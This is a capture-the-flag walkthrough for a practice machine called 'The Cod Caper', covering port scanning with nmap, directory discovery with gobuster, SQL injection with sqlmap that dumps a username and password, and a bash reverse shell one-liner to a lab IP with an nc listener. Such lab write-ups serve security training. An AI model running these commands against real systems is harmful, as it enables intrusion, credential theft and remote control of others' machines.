# The Cod Caper


<details>
  <summary>Host Enumeration</summary>

### Host Enumeration

The first step is to see what ports and services are running on the target machine.

**🔹 Recommended tool:** `nmap`

#### Useful flags:

- `-p`  
  Used to specify which port to analyze. Can also specify a range of ports, e.g. `-p 1-1000`.

- `-sC`  
  Runs default scripts on the port — useful for basic analysis of the service running on a port.

- `-A`  
  Aggressive mode — goes all out to gather as much information as possible.


---

```bash
nmap -sCV 10.10.108.49
```

``Output``

```java
Nmap scan report for 10.10.108.49
Host is up (0.53s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.62 seconds
```

![image](https://github.com/user-attachments/assets/9ce2b1f0-4d29-4579-8124-88b380c49470)




  
</details>










<details>
  <summary>Web Enumeration</summary>


### Web Server Enumeration

Since the only services running are **SSH** and **Apache**, it is safe to assume that we should check out the web server first for possible vulnerabilities. One of the first things to do is to see what pages are available to access on the web server.

**🔹 Recommended tool:** `gobuster`

#### Useful flags:

- `-x`  
  Used to specify file extensions, e.g. `"php,txt,html"`.

- `--url`  
  Used to specify which URL to enumerate.

- `--wordlist`  
  Used to specify the wordlist that is appended to the URL path, e.g.:



---

```
gobuster dir -u http://10.10.108.49/ -w /home/kali/Downloads/wordlists/SecLists/Discovery/Web-Content/big.txt -x html,php,txt,bak -t 30
```

![image](https://github.com/user-attachments/assets/295ae41e-c3ef-4b2c-9536-160696262b01)




![image](https://github.com/user-attachments/assets/ba89a246-398d-4344-971d-664215e83f22)

![image](https://github.com/user-attachments/assets/d50560fb-708a-4bb3-990a-4c666232e558)


  
</details>





<details>
  <summary>Web Exploitation</summary>


### SQL Injection Testing

The admin page seems to give us a login form. In situations like this, it is always worth checking for **low-hanging fruit**. In the case of login forms, one of the first things to check for is **SQL Injection**.

**🔹 Recommended tool:** `sqlmap`

#### Useful flags:

- `-u`  
  Specifies which URL to attack.

- `--forms`  
  Automatically selects parameters from `<form>` elements on the page.

- `--dump`  
  Used to retrieve data from the database once SQL Injection is found.

- `-a`  
  Grabs just about everything from the database.



---


```
sqlmap -u http://Target_IP/administrator.php --dbs --forms
```

![image](https://github.com/user-attachments/assets/45c686fe-e118-42fe-a8ee-34d3ab3c3223)

```
sqlmap -r Request.txt -D users --tables users --dump
```

```
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
```

![image](https://github.com/user-attachments/assets/2b9a5828-8faf-4bc8-9710-ad60c378b543)


![image](https://github.com/user-attachments/assets/7a52fbba-3378-4f87-ad45-47bffc08b505)

---

> after login

![image](https://github.com/user-attachments/assets/75a75609-2ec9-425d-8a12-a7899bf04bc5)


  
</details>










<details>
  <summary>Command Execution</summary>


### Post-Exploitation: Gaining Access

It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account. Let's run a few test commands, and then try to gain access!

---

#### Method 1: `nc` Reverse Shell

This machine has been outfitted with `nc`, a tool that allows you to make and receive connections and send data. It is one of the most popular tools to get a reverse shell.

➡ Some great places to find reverse shell payloads:  
- [HighOnCoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

After this, you will need to do additional enumeration to find **pingu's SSH key** or **hidden password**.

---

#### Method 2: Hidden Passwords

Assuming my father hasn't modified the machine since he took over my old PC, I should still have my hidden password stored somewhere — I don’t recall though, so you'll have to find it!

**🔹 Recommended tool:** `find`  
Allows you to search for files a specific user owns.


---


```
bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'
```

```
nc -lvnp 4444
```

![image](https://github.com/user-attachments/assets/51333772-af4e-41db-b561-9454386a80d4)



  
</details>














































